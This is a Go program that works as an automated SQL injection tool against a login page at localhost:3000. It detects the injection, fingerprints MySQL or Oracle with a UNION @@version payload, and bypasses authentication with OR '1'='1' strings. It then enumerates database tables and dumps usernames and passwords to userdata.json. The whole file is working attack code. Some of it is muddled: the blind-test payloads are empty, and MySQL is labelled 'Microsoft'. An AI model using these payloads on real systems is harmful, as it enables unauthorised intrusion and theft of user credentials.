package main

import (
		"fmt"
		"time"
		"io/ioutil"
		"os"
		"log"
		"net/http"
		"net/url"
		"strings"
		"regexp"
		"encoding/json"
)

type Userdata struct {
	Id string;
	Username string;
	Password string;
}

func get_response(data url.Values) (int, string) {
	resp, err := http.PostForm("http://localhost:3000/admin/panel_login.php", data);
	if (err != nil) {
		log.Fatal(err);
	}

	body, err := ioutil.ReadAll(resp.Body);
	if (err != nil) {
		log.Fatal(err);
	}

	return resp.StatusCode, string(body);
}

func blind_sqli_test() bool {
	mysql_time_delay := func() bool {
		data := url.Values {
			"username":		{""},
			"password":		{""},
		};
		start := time.Now();
		code, body := get_response(data);
		elapsed := time.Since(start)
		fmt.Printf("(MySQL)Time between request and respone: %s\n", elapsed);
		fmt.Println("Was the time delay successful?: ");
		var response string;
		fmt.Scanln(&response);
		if (response == "Y") {
			fmt.Println(body, code);
			return true;
		}
		return false;
	}

	oracle_time_delay := func() bool {
		data := url.Values {
			"username":		{""},
			"password":		{""},
		};
		start := time.Now();
		code, body := get_response(data);
		elapsed := time.Since(start)
		fmt.Printf("(Oracle)Time between request and respone: %s\n", elapsed);
		fmt.Println("Was the time delay successful?: ");
		var response string;
		fmt.Scanln(&response);
		if (response == "Y") {
			fmt.Println(body, code);
			return true;
		}
		return false
	}

	result := mysql_time_delay();
	if (!result) {
		oracle_time_delay();
	}
	return false;
}

func check_sqli() bool {
	data := url.Values {
		"username":		{"''"},
		"password":		{"'"},
	};

	var good bool = false;

	var code int;
	var body string;
	code, body = get_response(data);

	if (code == 500) {
		good = true;
	}

	data = url.Values {
		"username":		{"''"},
		"password":		{"''"},
	};

	code, body = get_response(data);
	if (code == 200) {
		good = true;
	}

	if (good && (body != "")) {
		return true;
	} else {
		fmt.Println("Previous tests failed, move to blind testing?: ");
		var response string;
		fmt.Scanln(&response);
		if (response == "Y") {
			good = blind_sqli_test();
			if (good) {
				return true;
			}
			return false;
		}
	}
	return false;
}

func get_version() string {
	data := url.Values {
		"username":		{"admin"},
		"password":		{"test' UNION SELECT 1,2,@@version;-- "},
	};
	code, body := get_response(data);
	if (code == 500 || (strings.Contains(body, "Fatal"))) {
		return "Oracle";
	}
	return "Microsoft";
}

func write_data(name string, userdata_obj []Userdata) bool {
	err := ioutil.WriteFile(name, []byte("[\n"), 0644)
	if (err != nil) {
		log.Println(err);
	}
	file, err := os.OpenFile(name, os.O_APPEND|os.O_WRONLY, 0644);
	if (err != nil) {
		log.Println(err);
	}
	var data string;
	for _, val := range userdata_obj {
		defer file.Close();
		data = "{\n\t\"id\":\""+val.Id+"\",\n\t\"username\":\""+val.Username+"\",\n\t\"password\":\""+val.Password+"\"\n},\n";
		if _, err := file.WriteString(data); err != nil {
			log.Fatal(err);
		}
	}
	file.WriteString("]");
	file.Close();
	return true;
}

func parse_data(data string) string {
	re := regexp.MustCompile(`JSONSTART\[.*?\]JSONEND`);
	foo := re.FindString(data);
	reg := regexp.MustCompile(`\[(\{.*?\,?})+\]`);
	bar := reg.FindString(foo);
	final := strings.Replace(bar, "}{", "},{", 10000);
	return string(final);
}

func user_data_enum() {
	data := url.Values {
		"username":		{"admin'OR'1'-'1"},
		"password":		{"test'OR'1'='1'-- "},
	};
	code, body := get_response(data);
	if (code == 200 && !(strings.Contains(body, "Fatal"))) {
		fmt.Println("************************ USER DATA DISCOVERED ***************************\n");
		fmt.Println("************************** ENUMERATING NOW ******************************\n");
		var parsed_data string = parse_data(body);
		var json_data []Userdata;
		json.Unmarshal([]byte(string(parsed_data)), &json_data);
		fmt.Println("USER DATA DISCOVERED:\n");
		for _, val := range json_data {
			fmt.Printf("\tID: %-3s\t|\tUSER: %-18s\t|\tPASSWORD: %-25s\n", val.Id, val.Username, val.Password);
		}
		write_data("userdata.json", json_data);
	}
}

func mysql_database_data_enum() {
	data := url.Values {
		"username":		{"admin'OR'1'='1"},
		"password":		{"test' UNION SELECT table_name,table_schema,table_type FROM information_schema.tables;-- "},
	};
	code, body := get_response(data);
	if (code == 200 && !(strings.Contains(body, "Fatal"))) {
		var parsed_data string = parse_data(body);
		var db_data []Userdata;
		json.Unmarshal([]byte(string(parsed_data)), &db_data);
		fmt.Println("DATABASE DATA DISCOVERED:\n");
		for _, val := range db_data {
			fmt.Printf("\tTABLE NAME: %-50s\t|\tTABLE SCHEMA: %-25s\t|\tTABLE TYPE: %-10s\n", val.Id, val.Username, val.Password);
		}
		write_data("mysql.info", db_data);
	}
}

func oracle_database_data_enum() {
	data := url.Values {
		"username":		{"admin'OR'1'='1"},
		"password":		{"test' UNION SELECT owner, table_name, tablespace_name FROM all_tables-- "},
	};
	code, body := get_response(data);
	if (code == 200 && !(strings.Contains(body, "Fatal"))) {
		var parsed_data string = parse_data(body);
		var db_data []Userdata;
		json.Unmarshal([]byte(string(parsed_data)), &db_data);
		fmt.Println("DATABASE DATA DISCOVERED:\n");
		for _, val := range db_data {
			fmt.Printf("\tTABLE NAME: %-50s\t|\tTABLE SCHEMA: %-25s\t|\tTABLE TYPE: %-10s\n", val.Id, val.Username, val.Password);
		}
		write_data("oracledb.info", db_data);
	}
}

func mysql_enumeration() {
	mysql_database_data_enum();
	user_data_enum();
}

func oracle_enumeration() {
	oracle_database_data_enum();
	user_data_enum();
}

func main() {
	var vuln bool = check_sqli();
	fmt.Println("\n********************* BEGINNING SQLinjection SCAN ***********************\n");
	if (vuln == true) {
		fmt.Println("************APPLICATION IS VULNERABLE TO SQLi, VERSION TESTING***********\n");
		var _type string = get_version();
		if (_type == "Microsoft") {
			fmt.Println("****************** MICROSOFT MYSQL DATABASE IN USE **********************\n");
			mysql_enumeration()
			fmt.Println("\n********************** LOGGING DISCOVERED DATA **************************\n");
		} else if (_type == "Oracle") {
			fmt.Println("**********************ORACLE SQL DATABASE IN USE*************************\n");
			oracle_enumeration()
			fmt.Println("\n********************** LOGGING DISCOVERED DATA **************************\n");
		} else {
			fmt.Println("*******************UNABLE TO DETERMINE DATABASE TYPE*********************\n");
		}
	}
}
